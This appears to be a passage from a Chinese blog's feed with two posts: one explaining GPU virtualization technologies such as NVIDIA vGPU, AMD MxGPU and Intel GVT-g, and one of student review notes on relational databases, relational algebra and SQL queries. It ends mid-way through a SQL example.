    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>GPU图形接口虚拟化的原理主要是通过软件和硬件技术，将单个物理GPU资源虚拟化成多个独立的虚拟显卡资源，从而可以供多个虚拟机或用户同时使用。</p><p>在没有虚拟化的情况下，物理GPU直接与单一的主机操作系统和应用程序交互，为其提供图形处理能力。虚拟化后，GPU的物理资源（如处理器核心、显存等）被抽象、封装成多个独立的虚拟GPU（vGPU），每个vGPU可以被单独分配给不同的虚拟机。这样，多个虚拟机就能够共享同一个物理GPU的资源，同时享有GPU加速的优势。</p><h3 id="主流的GPU虚拟化技术："><a href="#主流的GPU虚拟化技术：" class="headerlink" title="主流的GPU虚拟化技术："></a>主流的GPU虚拟化技术：</h3><ol><li><strong>NVIDIA vGPU:</strong> NVIDIA的虚拟GPU(vGPU)技术使得一块物理GPU可以被分割为多个独立的虚拟GPU，每个虚拟GPU都可以被一个虚拟机独立使用。每个虚拟GPU都有自己的分配的GPU内存和独立的GPU调度，此外NVIDIA的vGPU支持CUDA和OpenCL，可以运行AI和深度学习工作负载。</li></ol><p><a href="https://docs.nvidia.com/grid/16.0/grid-vgpu-user-guide/index.html">参考：vGPU使用文档</a></p><ol start="2"><li><strong>AMD MxGPU:</strong> AMD的MxGPU是另一款主流的GPU虚拟化解决方案，它使用基于硬件的SR-IOV（Single Root I&#x2F;O Virtualization）技术，将一个物理PCIe GPU变成多个PCIe vGPU，每个PCIe vGPU直接透传给虚拟机，实现多虚拟机共享一个物理GPU。每个虚拟机都有自己的虚拟GPU，并且可以使用标准的AMD驱动和开发工具。</li></ol><p><a href="https://zhuanlan.zhihu.com/p/683147438">参考：AMD与NVIDIA vGPU方案对比</a></p><p><a href="https://community.amd.com/t5/visual-cloud/sr-iov-baser-gpu-virtualization-for-a-true-workstation/ba-p/414277">参考：SR-IOV-Baser GPU 虚拟化，实现真正的工作状态</a></p><ol start="3"><li><strong>Intel GVT-g:</strong> Intel的图形虚拟化技术GVT-g可以将一个物理GPU分割成多个虚拟GPU，每个虚拟GPU可以被一个虚拟机使用。GVT-g使用软件调度来管理多个虚拟GPU的共享访问，支持Windows和Linux虚拟机，并且可以使虚拟机运行游戏和图形设计软件。</li></ol><p>​英特尔 GVT-g 是一种为英特尔 GPU（Broadwell 和更高版本）提供中介设备直通的技术。它可用于虚拟化多个客户机虚拟机的 GPU，从而有效地在虚拟机中提供近乎本机的图形性能，并且仍允许主机正常使用虚拟化 GPU。如果希望在没有专用 GPU 的超极本上运行的 Windows 虚拟机中加速图形，以实现完全设备直通</p><p><a href="https://wiki.archlinux.org/title/Intel_GVT-g">参考：英特尔GVT-g</a></p><ol start="4"><li><strong>Virgil 3D project:</strong> Virgil是一个开源项目，旨在允许模拟出的虚拟硬件有GPU，从而为虚拟机提供3D硬件加速。Virgil 3D还可以向客户虚拟机翻译OpenGL和其他GPU命令。</li></ol><p><a href="https://lwn.net/Articles/611212/">参考：Virgil 3D：虚拟 GPU </a></p><h3 id="GPU图形化接口"><a href="#GPU图形化接口" class="headerlink" title="GPU图形化接口"></a>GPU图形化接口</h3><p>GPU图形接口虚拟化涉及将GPU的图形渲染能力划分并分配给多个虚拟机或用户，从而使它们能够独立运行图形密集型的应用程序。这包括3D建模、图形设计、视频编辑和游戏等。图形接口虚拟化允许在虚拟环境中使用GPU来进行硬件加速的图形处理，可以显著提升远程桌面和云游戏的体验。</p><p>一些关键的技术和产品包括：</p><ol><li><p><strong>NVIDIA GRID</strong>:</p><ul><li>NVIDIA GRID可用于提供虚拟桌面和应用程序的硬件加速图形。</li><li>利用NVIDIA的Kepler及更高架构的GPU，其中的vGPU（虚拟GPU）技术可以将单个GPU划分成多个虚拟GPU实例供用户使用。</li><li>支持多种虚拟化环境，包括VMware vSphere&#x2F;ESXi, Citrix XenServer以及云服务如Amazon Web Services。</li></ul></li><li><p><strong>AMD Multiuser GPU (MxGPU)</strong>:</p><ul><li>基于SR-IOV（单根I&#x2F;O虚拟化）的技术，AMD的MxGPU技术能在GPU硬件级别上实现虚拟化。</li><li>不同于NVIDIA的软件虚拟化方案，MxGPU提供了硬件隔离，旨在提高安全性。</li><li>每个虚拟机都有自己的虚拟GPU，可以直接运行AMD的原生图形驱动。</li></ul></li><li><p><strong>Intel Graphics Virtualization Technology (Intel GVT)</strong>:</p><ul><li>Intel GVT分成几个模式，GVT-d, GVT-g 和 GVT-s。</li><li>GVT-g允许一个物理GPU在多个VM之间分享，每个虚拟机可以独立访问它的虚拟GPU资源。</li></ul></li><li><p><strong>Virglrenderer(Virgil 3D project)</strong>:</p><ul><li>Virglrenderer是一个实现3D加速的项目，它通过GNU&#x2F;Linux上的QEMU使用GPU硬件加速，提供OpenGL加速渲染。</li><li>它允许客户机通过虚拟化的环境使用GPU，提供图形加速。</li></ul></li><li><p><strong>VMware vSphere &#x2F; Horizon View</strong>:</p><ul><li>VMware的vSphere提供GPU虚拟化方案，通过DirectX或OpenGL</li></ul></li></ol><h3 id="其中的关键技术"><a href="#其中的关键技术" class="headerlink" title="其中的关键技术"></a>其中的关键技术</h3><ol><li><p><strong>虚拟化软件或Hypervisor</strong>：</p><ul><li>它是虚拟化的核心，控制并管理物理硬件资源与虚拟机之间的分配与调度。</li><li>Hypervisor在物理主机和虚拟机之间提供一层抽象，拦截虚拟机的硬件请求，并将这些请求转换为对实际物理硬件的操作。</li></ul></li><li><p><strong>虚拟GPU (vGPU) 技术</strong>：</p><ul><li>物理GPU被分割成多个vGPU实例，每个实例都有自己的一部分GPU资源，比如一定量的显存、GPU核心的时间片等。</li><li>每个虚拟机都认为它有自己的GPU，实际上只是使用了物理GPU的一部分资源。</li></ul></li><li><p><strong>图形驱动和API虚拟化</strong>：</p><ul><li>图形驱动程序需要能够理解vGPU，并且转换虚拟机的图形调用到物理GPU。</li><li>API虚拟化确保了虚拟环境中的图形API调用（如OpenGL或DirectX）可以正确解释并映射到物理硬件。</li></ul></li><li><p><strong>资源管理和调度</strong>：</p><ul><li>虚拟化平台需要合理管理和调度物理GPU资源给各个vGPU实例。</li><li>好的调度策略可以保证所有虚拟机的图形任务公平且有效率地执行。</li></ul></li><li><p><strong>直通 (Pass-Through) 和SR-IOV技术</strong>：</p><ul><li>直通技术不涉及资源分割，它允许一个虚拟机直接控制和访问一个物理GPU，提供几乎原生的性能。</li><li>SR-IOV技术允许一个物理设备呈现为多个分离的虚拟化设备，每个都可以被直接分配给虚拟机。</li></ul></li></ol><h5 id="附1：关于Intel-GVT的三种模式介绍"><a href="#附1：关于Intel-GVT的三种模式介绍" class="headerlink" title="附1：关于Intel GVT的三种模式介绍"></a>附1：关于Intel GVT的三种模式介绍</h5><ol><li><p><strong>GVT-d（直通式&#x2F;Direct Assignment）</strong>：</p><p>GVT-d是一种完全分配的虚拟化方法，将物理GPU直接分配给一个虚拟机使用。在这种模式下，虚拟机可以直接访问GPU的全部功能，它能提供几乎等同于物理机上的GPU性能。由于GPU被完全分配了，所以同一时间只能有一个虚拟机使用这块GPU，不支持资源共享。</p></li><li><p><strong>GVT-g（时间共享&#x2F;Time-sharing）</strong>：</p><p>GVT-g是一种基于时间片的共享GPU资源方法。它将GPU资源分割成多个独立的虚拟GPU（vGPU实例），每个虚拟机获得一个vGPU实例。每个vGPU能够访问物理GPU的一部分资源，并且可以根据时间片轮流访问GPU，以此实现同时多个虚拟机共享GPU资源。这种方法可以支持多用户或多任务场景，适用于需要为多个虚拟机提供图形加速的情况。</p></li><li><p><strong>GVT-s（空间共享&#x2F;Space-sharing）</strong>：</p><p>GVT-s与GVT-g相似，都是共享模式，但它通常是在具有SR-IOV（Single Root I&#x2F;O Virtualization）支持的GPU上使用的。GVT-s通过将GPU的资源划分成多个虚拟功能（VF），然后这些VF可以静态分配给不同的虚拟机。这种模式适合于那些需要固定且隔离GPU资源的场合，每个VF都有独立的GPU资源，不与其他VF共享。</p></li></ol><h5 id="附2：英伟达-NVIDIA-vGPU架构"><a href="#附2：英伟达-NVIDIA-vGPU架构" class="headerlink" title="附2：英伟达(NVIDIA)vGPU架构"></a>附2：英伟达(NVIDIA)vGPU架构</h5><p><img src="https://s2.loli.net/2024/04/15/nEa6i517DIrXSfK.png" alt="image-20240415170250289"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;GPU图形接口虚拟化的原理主要是通过软件和硬件技术，将单个物理GPU资源虚拟化成多个独立的虚拟显卡资源，从而可以供多个虚拟机或用户同时使用。</summary>
      
    
    
    
    <category term="操作系统" scheme="https://ycx6666.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="GPU虚拟化" scheme="https://ycx6666.github.io/tags/GPU%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>数据库复习</title>
    <link href="https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A01-md/"/>
    <id>https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A01-md/</id>
    <published>2024-04-14T14:19:08.528Z</published>
    <updated>2024-04-15T10:46:33.437Z</updated>
    
    <content type="html"><![CDATA[<p>#数据库复习(算是?)</p><p align="center">  <br>  </p><h2 style="text-align:center;color:#F4E0EA">    樱春雪    </h2>  <br>  <br>    <div style="text-align:center">    <a href="https://codeload.github.com/liangjingkanji/DrakeTyporaTheme/zip/refs/heads/master">湖南大学</a>  | <a href="https://theme.typora.io/theme/Drake/">软件工程</a>  | <a href="https://github.com/liangjingkanji/DrakeTyporaTheme/blob/master/issues.md">22级</a></div><br><br>  <br><p></p><h3 id="一、绪论"><a href="#一、绪论" class="headerlink" title="一、绪论"></a>一、绪论</h3><h4 id="1-数据库管理的五个问题"><a href="#1-数据库管理的五个问题" class="headerlink" title="1.数据库管理的五个问题"></a>1.数据库管理的五个问题</h4><ul><li>数据<strong>正</strong>确性问题</li><li>数据<strong>易</strong>用性问题</li><li>数据<strong>完</strong>整性</li><li>数据安<strong>全</strong>性问题</li><li>数据处理<strong>性</strong>能问题</li></ul><h4 id="2-数据库技术的演进"><a href="#2-数据库技术的演进" class="headerlink" title="2.数据库技术的演进"></a>2.数据库技术的演进</h4><ol><li>分布式数据库</li><li>面向对象数据库</li><li>NoSql数据库</li><li>数据仓库，大数据</li></ol><h4 id="3-数据-有用性-信息"><a href="#3-数据-有用性-信息" class="headerlink" title="3.数据+有用性&#x3D;信息"></a>3.数据+有用性&#x3D;信息</h4><ol><li><p>类别性:</p><p>每类数据都有很多项，构成一个数据集</p></li><li><p>有用性：</p></li><li><p>语义性：</p></li></ol><h4 id="4-数据库需要解决三个问题：空间距离、交通运输成本、速度"><a href="#4-数据库需要解决三个问题：空间距离、交通运输成本、速度" class="headerlink" title="4.数据库需要解决三个问题：空间距离、交通运输成本、速度"></a>4.数据库需要解决三个问题：空间距离、交通运输成本、速度</h4><h4 id="5-数据库的特点"><a href="#5-数据库的特点" class="headerlink" title="5.数据库的特点"></a>5.数据库的特点</h4><p><img src="https://s2.loli.net/2024/04/07/Ch2gwibI9faXLR5.png" alt="image-20240405222701146"></p><h5 id="数据库的组成："><a href="#数据库的组成：" class="headerlink" title="数据库的组成："></a>数据库的组成：</h5><p>数据库有表组成，表包括模式和数据</p><blockquote><p>数据库是一个数据的集合，所有的数据都存放在数据库中，数据库中的数据是<strong>海量的、共享的</strong></p></blockquote><p>数据库严格按类的概念来<strong>组织数据、分类存储</strong></p><p>一份类对应一张表，同类数据都存储在一张表中。</p><p>一个<strong>实例</strong>对应表中的<strong>一行数据</strong>，表中的一行数据对应一个实例</p><p>类与类之间有关系~&gt;实例与实例之间有关系</p><h4 id="6-数据操作"><a href="#6-数据操作" class="headerlink" title="6.数据操作"></a>6.数据操作</h4><p><strong>添加数据、修改数据、删除数据、查询数据、统计数据</strong></p><p>&#x3D;&#x3D;数据库管理系统&#x3D;&#x3D;(DBMS)来受理用户的数据操作请求，完成数据操作，反馈结果给用户。</p><p>数据库模式中，数据的用户通过数据库应用程序来完成。</p><p><strong>数据库、数据库管理系统和数据库应用程序构成了数据库系统</strong></p><h4 id="7-数据库系统的基本特征"><a href="#7-数据库系统的基本特征" class="headerlink" title="7.数据库系统的基本特征"></a>7.数据库系统的基本特征</h4><p>•各种各类的业务数据将<strong>集中</strong>到数据库中，<strong>统一管理</strong>，实现<strong>共享</strong>。</p><p>•特性：数据库的<strong>拥有者</strong>相对明确，数据库的<strong>用户</strong>则在<strong>不断扩增，难以事先预测</strong>。</p><p>•<strong>数据库应用程序</strong>的<strong>通用性</strong>：能够对不同的<strong>数据库</strong>进行访问。</p><p>•<strong>数据库管理系统</strong>、<strong>数据库应用程序</strong>既具有<strong>相互独立性</strong>，又具有<strong>可对接性</strong>，构成<strong>邦联式系统</strong>。数据库访问标准和规范。DBMS开发厂家和数据库应用程序开发商。</p><p>•数据库访问标准和规范：<strong>关系数据模型，数据操作表达语言，数据库访问编程接口</strong>。</p><h4 id="8-DB的三级模式架构"><a href="#8-DB的三级模式架构" class="headerlink" title="8.DB的三级模式架构"></a>8.DB的三级模式架构</h4><p><strong>内模式</strong>~~~&gt;(概念模式\内模式映射)~~~&gt;概念模式~~~~&gt;(外模式\概念模式映射)~~~&gt;外模式</p><ul><li><strong>系统的结构特性：模块化，分层结构。数据库应用程序和数据库管理系统构成邦联式系统，它俩彼此之间既具有相互独立性，又具有可对接集成性。原因是数据操作的表达，以及数据库访问编程接口，都已形成了国际标准</strong>。</li></ul><h4 id="9-数据库其他"><a href="#9-数据库其他" class="headerlink" title="9.数据库其他"></a>9.数据库其他</h4><p>•<strong>关系模型</strong>，<strong>事务处理</strong>，<strong>数据库设计方法</strong>m，<strong>SQL</strong>，<strong>ODBC&#x2F; JDBC</strong>是数据库技术<strong>发展中的标志性成果，也是数据库技术的核心内容。</strong></p><p>•数据库应用领域的<strong>从业人员</strong>角色有三种：<strong>数据库设计人员</strong>，<strong>数据库系统管理人员</strong>，<strong>数据库应用程序开发人员</strong>。</p><p>•流行的数据库管理系统<strong>产品</strong>有<strong>Oracle</strong>，<strong>SQL Server</strong>，<strong>DB2</strong>，<strong>MySQL</strong>。它们各有特色。</p><h3 id="二、关系数据模型"><a href="#二、关系数据模型" class="headerlink" title="二、关系数据模型"></a>二、关系数据模型</h3><p>数据模型</p><p>​关系数据模型；</p><p>​数据完整性约束；</p><p>​关系代数；</p><p>​关系数据库基本特征；</p><h4 id="1-数据模型"><a href="#1-数据模型" class="headerlink" title="1.数据模型"></a>1.数据模型</h4><blockquote><p>数据模型是指描述数据、数据间的关系、对数据的约束的有关概念。数据模型包括</p><p><strong>数据结构、数据完整性约束、数据运算</strong>三个部分，其目的是<strong>提供一个框架，实现数据操作简单容易，做到数据正确、安全、完整</strong></p></blockquote><h4 id="2-关系数据模型"><a href="#2-关系数据模型" class="headerlink" title="2.关系数据模型"></a>2.关系数据模型</h4><p>&#x3D;&#x3D;关系就是表&#x3D;&#x3D;</p><ul><li>数据结构：二维表</li><li>数据完整性约束：实体、引用、域、业务规则</li><li>数据运算：关系代数</li></ul><h4 id="3-关系的特性"><a href="#3-关系的特性" class="headerlink" title="3.关系的特性"></a>3.关系的特性</h4><ol><li>在一个数据库中，表的名字要唯一，不能出现同名的表</li><li>在一个表中，列的名字要唯一，不能出现同名的列</li><li>每行数据表达一个实例，一个实例在一个表中<strong>只有一行数据</strong></li><li>表中的列具有<strong>对等性、没有等级区别</strong></li><li>表中的列具有<strong>对等性、没有先后概念</strong></li></ol><h4 id="4-按照原样存储的表的三个问题"><a href="#4-按照原样存储的表的三个问题" class="headerlink" title="4.按照原样存储的表的三个问题"></a>4.按照原样存储的表的三个问题</h4><ul><li>数据冗余问题</li><li>删除问题</li><li>修改问题</li></ul><h4 id="5-解决"><a href="#5-解决" class="headerlink" title="5.解决"></a>5.解决</h4><ul><li><p>判断数据重复</p><p>&#x3D;&#x3D;列重复&#x3D;&#x3D;</p><p><strong>主键约束</strong>(一个表中是否存在两行数据指向一个对象)</p><p>在一个数据库中，当定义一个表的模式时，必须指明该表的主键</p><p>&#x3D;&#x3D;行重复&#x3D;&#x3D;</p><p>如果行重复，DBMS会拒绝修改，</p><p>&#x3D;&#x3D;外键约束&#x3D;&#x3D;</p><p>在含<strong>外键</strong>的表中<strong>，添加</strong>行数据<strong>，或者</strong>修改<strong>已有</strong>行数据中的外键字段<strong>的值时，DBMS要检查，看</strong>是否违背外键约束</p><p>当定义一个表的模式时，如果引用了其他表的外键，就必须指明，不能遗漏。</p><p>表分为关系表和实体表，实体表中也可能含有外键</p></li><li><p>业务规则约束</p></li></ul><h4 id="6-超键和候选键"><a href="#6-超键和候选键" class="headerlink" title="6.超键和候选键"></a>6.超键和候选键</h4><p>~~超键（Super Key） （键也成为 码，如 超码）</p><p>关系中的一个属性组（含有1个或多个列的组），其值能唯一标识一个元组（即：行）。这样的属性组称作该关系的超键</p><p>如学生信息表中的<code>学号</code> 可作为超键，<code>号，姓名</code>也是超键</p><p> 又如，学院信息表中<code>学院编号</code>，<code>学院名称</code> 都是超键</p><p>  又如，选课表中<code>学号，课程号，学期</code> 是超键</p><p>一个属性组，如果其子集是超键，则该属性组也是超键，即任何超键的超集还是超键</p><pre><code class="候选键（Candidate">满足特殊条件的超键：如果一个超键删除任何一个属性后都不再是超键，则该键为该关系的候选键。即子集都不是超键的超键为候选键选课表中` 学院编号，学院名称 ` **不是候选键**任何一个候选键中的属性称作主属性（Prime Attribute）  不属于任何一个候选键中的属性称作非主属性#### 7.关系模式关系的描述称作关系模式，包括关系名、关系中的属性名、属性向域的映象、属性间的数据依赖关系等，记作R(A1 , A2 ,…, An ) R是关系名（表名），Ai是属性名（列）属性向域的映象一般直接说明为属性的类型、长度等某一时刻对应某个关系模式的内容(元组的集合)称作关系关系模式是型（schema），是稳定的关系是某一时刻的值，是随时间不断变化的#### 8.数据完整的反义词是数据损坏#### 9.确保数据完整性&gt;**数据**有现实含义，与现实情况相符一致；满足业务规则；- **实体完整性(约束)**：每个表都有主键，并且作为主键的一个或者多个列对应的值唯一- **参照完整性(约束)：**任何外键的值，要么为null，要么存在于另一张表中主键的值，确保不会引用一个==不存在的值==- **域完整性(约束):**每一列有明确的数据类型、数据格式和数值范围以及是否可以为==null==- **用户自定义完整性(约束)：**针对某一具体应用的数据必须满足的语义要求。–例如，家庭地址数据中，地址相同的两行，其邮政编码也必须相同。又如：列值唯一性，学院编码是主键，学院名称不是主键的一部分，但学院名称也必须保持唯一性，这个唯一性是现实语义上不同学院不能重名**，列唯一性在关系模型中用unique关键字指明某列取值唯一。**#### 10.DBMS负责数据库中的数据具有完整性&gt; 如果用户操作会导致数据的完整性被打破，那么DBMS就会拒绝受理他&gt;&gt; 如果不违背完整性约束，那么就会受理他#### 11.数据库系统的特性##### 关系型数据库的表有三种：- 专一性:数据严格按类分表保存- 全局性：一个数据在数据库只存一份，不能重复存储，一个类只对应一个表。- 联系性：表与表之间存在联系，体现在外键上。##### 用户的业务数据表也有三种：局部性、综合性、多样性- 局部性是指他仅只是数据库中表的部分行和部分列- 综合性是指他的列分布在数据库不同的表之中、- 多样性是指用户业务所需的表各式各样#### 12.关系代数的运算类型![image-20240406205401493](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406205401493.png)**投影运算会去除相同的行****并运算：**![image-20240406210123580](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406210123580.png)**差运算**![image-20240406210146574](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406210146574.png)**交运算**![image-20240406210223825](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406210223825.png)**笛卡尔乘积运算**![image-20240406211448729](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406211448729.png)![image-20240406211503212](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406211503212.png)**更名运算**P_&#123;(改名) (表格)##### θ链接![image-20240406212325068](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406212325068.png)##### 自然连接![image-20240406213246413](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406213246413.png)**自然连接需要两个表有共同的属性；而其中没有的产生联系的行(没有等值的行，不会出现在结果中)；含外键的表是主干表时，对于外简直为null的行，不会出现在结果中。**#### 13.外联接&gt; 笛卡尔积、θ链接等待称为内联接![image-20240406214223357](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406214223357.png)##### 半联接半联接起返回左表中与有右表至少匹配依次的数据行==通俗的来说==就是只按照组左表中的列来，左表中没有的列不会算进去##### 除运算见1.5实际上就是解决一类问题：**如何得到全部_副表_的_主表_元素&gt; 全部的那张表是被除的如：得到选修了全部课程的学生那么就直接将选课表除以课程表，**注意这样会将他们公共的属性剔除**![image-20240406215722752](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240406215722752.png)#### 13.运算的有优先级- 关系代数具有优先级- 一元运算(\sigma,\Pi)的优先级高于二元运算，二元运算中横向链接运算(\times,\bowtie)高于纵向运算(\cup,\cap,\neg)- 括号的运算级最高##### 五个基本运算$$\sigma \Pi \cup - \times$$其他运算都可以被表达出来### 三、数据操作语言DML（SQL的子集)#### 1.数据操作中，最核心、最关键的问题是查询#### 2.SQL规范中，select的结果允许重复#### 3.where子句比较运算符：**&lt;**、**&lt;** **=**、**&gt;**、**&gt;****=**、=、 **&lt;** **&gt;**逻辑运算符：**and**，**or**，**not**between：判断表达式的值是否在某范围内列出工资在500~800之间的老师姓名#### 4.重复元组的处理如果要去掉重复元组，可以用distinct指明<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> Ssharp</span><br><span class="line">form SC</span><br></pre></td></tr></table></figure>#### 5.元组显示顺序命令：order by 列名/第几列 [asc\desc]//从小到大，从大到小<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> S</span><br><span class="line">orderd <span class="keyword">by</span> AGE <span class="keyword">asc</span>,SNAME <span class="keyword">desc</span></span><br></pre></td></tr></table></figure>#### 6.更名运算old_name as new_name==as 可选==#### 7.字符串操作列名 [not] like ‘字符串&#39;**匹配规则**&gt;- ’%‘：匹配零个或者多个字符串&gt;- &#39;_&#39;:单个下户线匹配任意单个字符&gt;- &#39;[]&#39;：任何在指定范围内的字符&gt;&gt;[a-f],[abcdef] &gt;&gt;- &#39;[^]&#39;:任何不在指定范围内的字符&gt;&gt;- [^a-f]##### Escape&gt; 被定义为转义字符，&gt;&gt; 如escape&#39;\&#39;，定义\为转移字符，则可用\%去匹配%,用\_取匹配_<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> C</span><br><span class="line"><span class="keyword">where</span> CNAME <span class="keyword">LIKE</span><span class="string">&#x27;%_d\__&#x27;</span> <span class="keyword">escape</span><span class="string">&#x27;\&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>#### 8.空值is [not] null注意事项：&gt;除is [not] null 之外，空值不满足任何查找条件&gt;&gt;如果null参与算术运算，则该算术表达式的值为==null==&gt;&gt;如果null参与比较运算，则可以视为==false==,在SQL-92中可看成unknown**示例：**找出成绩值为空的学生号<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Ssharp</span><br><span class="line"><span class="keyword">from</span> SC</span><br><span class="line"><span class="keyword">where</span> GRADE <span class="keyword">is</span> <span class="keyword">null</span></span><br><span class="line">不可写为 <span class="keyword">where</span> GRADE<span class="operator">=</span><span class="keyword">null</span></span><br></pre></td></tr></table></figure>##### isnull<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isnull(check_expression,relacement_value)</span><br></pre></td></tr></table></figure>如果check_expression 值为空，则返回replacement，否则返回check_expression(类似于三元表达式?)##### coalesce<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">coalesce</span>(expression1,expression2)</span><br></pre></td></tr></table></figure>返回第一个不为null的expression<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ssharp,csharp,coalesec(grade,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">from</span> sc</span><br></pre></td></tr></table></figure>##### 缺省情况下空值是==最后输出的==，当指定order by时，降序情况下==首先输出空值==，升序情况下==最后输出空值==。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> is_null,sal</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>首先输出空值，然后在从小到大输出</span><br></pre></td></tr></table></figure>#### 9.统计##### 五个基本聚集函数&gt;- COUNT ~ 求行数&gt;- SUM ~求和&gt;- AVG ~求平均值&gt;- MIN ~求最小值&gt;- MAX ~求最大值注意事项1. COUNT,MAX,MIN可对**任意类型的字段**，而SUM and AVG只对**数值型字段**2. SUM,AVG,MIN,MAX要求**查询结果只有有一列**3. 除了COUNT(*),其他函数都**忽略null值，count(列)也会忽略null**4. 统计结果是单一的值，从表概念来说，**只有一行**##### count(*) 和 count(列名)count(*)统计所有行，有些字段为空的也统计count(列名)该字段为NULL的不统计#### 10.分组统计(GROUP BY)&gt; 先对查询结果，选定某一字段或者某些字段进行分组，对查询结果的行，将分组字段的==值相同的行==放在一起构成一个组，于是，可能会形成多个组，再对每个组进行统计<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 列名 [<span class="keyword">having</span> 条件表达式]</span><br></pre></td></tr></table></figure>group by将表中的元组按照指定列上相等的原则分则，然后再每一份组上使用聚集函数，得到单一值having 对分组进行额外选择，只将聚集函数作用在满足额条件的分组上##### having 和 where 的区别having的粒度是==分组==，where的粒度是==行==#### 11.集合成员资格:int 子查询<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式 [<span class="keyword">not</span>] <span class="keyword">in</span> (子查询)</span><br></pre></td></tr></table></figure>用于判断表达式的值是否在子查询的结果中。E.G.<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">where</span> SNAME <span class="keyword">in</span> </span><br><span class="line">(<span class="string">&#x27;张军&#x27;</span>，<span class="string">&#x27;王宏&#x27;</span>)</span><br></pre></td></tr></table></figure>#### 12.集合之间的比较:some/all子查询$$表达式\quad  比较运算符 \quad \theta\quad  some\quad (子查询)$$&gt; 表达式的值至少与子查询结果中的一个值相比满徐比较运算符$$表达式\quad 比较运算符\theta \quad all \quad (子查询)$$&gt; 表达式的值与子查询结果中的所有的值相比都满足比较运算符![image-20240407103019311](%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF).assets/image-20240407103019311.png)#### 13.集合基数的测试:exist子查询**测试集合是否为空**<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[not] exists (子查询)</span><br></pre></td></tr></table></figure>判断子查询的结果集合中是否有任何元组存在&gt; in后的子查询与外层查询无关，每个子查询执行依次，而exists后的子查询与外层查询有关，需要执行多次，称之为==相关子查询==#### 14.反半联接not in \ not exists#### 15.除法在SQL中的表达$$\Pi_&#123;s\#,c\#&#125;(SC)\div\Pi_&#123;c\#&#125;(C) &lt;=&gt; not\quad exists...not\quad exists ...$$E.G.列出选修了全部课程的学生姓名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SNAME</span><br><span class="line"><span 